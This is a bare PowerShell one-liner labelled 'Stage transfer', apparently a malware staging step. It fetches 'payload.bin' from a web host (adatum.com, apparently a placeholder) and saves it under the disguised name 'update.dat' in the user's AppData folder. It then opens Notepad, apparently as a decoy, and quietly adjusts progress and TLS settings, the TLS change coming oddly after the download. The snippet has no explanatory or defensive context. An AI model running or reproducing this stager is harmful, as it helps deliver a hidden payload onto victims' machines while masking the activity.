
<# Stage transfer #> Invoke-WebRequest -Uri "http://adatum.com/payload.bin" -OutFile "$env:APPDATA\update.dat" -UseBasicParsing; Start-Process -FilePath "notepad.exe"; $ProgressPreference = "SilentlyContinue"; [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
